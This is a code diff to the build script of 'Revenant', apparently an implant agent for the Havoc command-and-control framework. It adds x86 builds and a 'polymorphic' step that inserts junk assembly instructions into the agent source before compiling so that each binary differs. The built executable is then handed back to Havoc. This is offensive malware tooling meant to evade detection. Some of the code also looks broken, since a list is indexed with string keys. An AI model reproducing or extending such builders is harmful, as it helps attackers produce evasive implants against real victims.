@@ -28,8 +28,32 @@ seed_str: str = ''.join(random.choices(string.ascii_letters, k=8))
 GENERATED_SEED = int(binascii.crc32(seed_str.encode())) # 0xDEADDEAD
 
 directory_path = "./Agent/Source/"
+#x86
+instructions_x86 = [
+    "nop",
+    "mov eax, eax",
+    "mov ecx, ecx",
+    "mov edx, edx",
+    "inc eax",
+    "dec eax",
+    "xor eax, eax",
+    "xor rax, rax",
+    "cmp eax, eax",
+    "test eax, eax",
+    ''"xor eax,eax" \
+    "xor ecx,ecx" \
+    "xor eax,eax" \
+    "xor ecx,ecx" \
+    "xor eax,eax" \
+    "xor ecx,ecx" \
+    "xor eax,eax"''
+]
+
+
+
+#x64
 # Volatile registers: rax, rcx, rdx, r8, r9
-instructions = [
+instructions_x64 = [
     "nop",
     "mov eax, ebx",
     "mov eax, ecx",
@@ -308,11 +332,11 @@ class Revenant(AgentType):
     def __init__(self):
         self.Name: str = "Revenant"
         self.Author: str = "0xTriboulet for Malicious Group"
-        self.Version: str = "0.3"
-        self.Description: str = "Revenant Agent Testing"
+        self.Version: str = "0.4"
+        self.Description: str = "Revenant"
         self.MagicValue = 0x72766e74
 
-        self.Arch: list = ["x64", "x86"]
+        self.Arch: list = ["64", "86"]
         self.Formats: list = [
             {"Name": "Windows Exe", "Extension": "exe"},
             {"Name": "Windows DLL", "Extension": "dll"}   # Not supported yet
@@ -349,37 +373,67 @@ class Revenant(AgentType):
             process_strings_h()
             print("[*] Configuring String.h header...")
 
-        if self.BuildingConfig["Polymorphic"]:
-            process_directory(directory_path, instructions, False)
-            print("[*] Configuring source files...")
-
-        # compile_command: str = "cd ./Agent && make"
-        compile_command: str = "cmake . && cmake --build . -j 1"
-
-        try:
-            process = subprocess.run(compile_command,
-                                     shell=True,
-                                     check=True,
-                                     stdout=subprocess.PIPE,
-                                     stderr=subprocess.PIPE,
-                                     universal_newlines=True)
+        if self.Arch["64"]:
 
             if self.BuildingConfig["Polymorphic"]:
-                process_directory(directory_path, instructions, True)
-                print("[*] Cleaning up source files...")
+                process_directory(directory_path, instructions_x64, False)
+                print("[*] Configuring source files...")
 
-            print(process.stdout)
-        except subprocess.CalledProcessError as error:
-            print(f"Error occurred: {error.stderr}")
+            compile_command: str = "cmake . && cmake --build . -DARCH=x64 -j 1"
+
+            try:
+                process = subprocess.run(compile_command,
+                                         shell=True,
+                                         check=True,
+                                         stdout=subprocess.PIPE,
+                                         stderr=subprocess.PIPE,
+                                         universal_newlines=True)
+
+                if self.BuildingConfig["Polymorphic"]:
+                    process_directory(directory_path, instructions_x64, True)
+                    print("[*] Cleaning up source files...")
+
+                print(process.stdout)
+            except subprocess.CalledProcessError as error:
+                print(f"Error occurred: {error.stderr}")
+
+                if self.BuildingConfig["Polymorphic"]:
+                    process_directory(directory_path, instructions_x64, True)
+                    print("[*] Cleaning up source files...")
+
+                return
+
+            data = open("Agent/Bin/x64/Revenant.exe", "rb").read()
+        elif self.Arch["86"]:
+            compile_command: str = "cmake . && cmake --build . -DARCH=x86 -j 1"
 
             if self.BuildingConfig["Polymorphic"]:
-                process_directory(directory_path, instructions, True)
-                print("[*] Cleaning up source files...")
+                process_directory(directory_path, instructions_x86, False)
+                print("[*] Configuring source files...")
 
-            return
+            try:
+                process = subprocess.run(compile_command,
+                                         shell=True,
+                                         check=True,
+                                         stdout=subprocess.PIPE,
+                                         stderr=subprocess.PIPE,
+                                         universal_newlines=True)
 
-        data = open("Agent/Bin/Revenant.exe", "rb").read()
+                if self.BuildingConfig["Polymorphic"]:
+                    process_directory(directory_path, instructions_x86, True)
+                    print("[*] Cleaning up source files...")
 
+                print(process.stdout)
+            except subprocess.CalledProcessError as error:
+                print(f"Error occurred: {error.stderr}")
+
+                if self.BuildingConfig["Polymorphic"]:
+                    process_directory(directory_path, instructions_x86, True)
+                    print("[*] Cleaning up source files...")
+
+                return
+
+            data = open("Agent/Bin/x86/Revenant.exe", "rb").read()
         # Below line sends the build executable back to Havoc for file management - 0xtriboulet
         self.builder_send_payload(config['ClientID'], self.Name + "." + self.Formats[0]["Extension"], data)
 
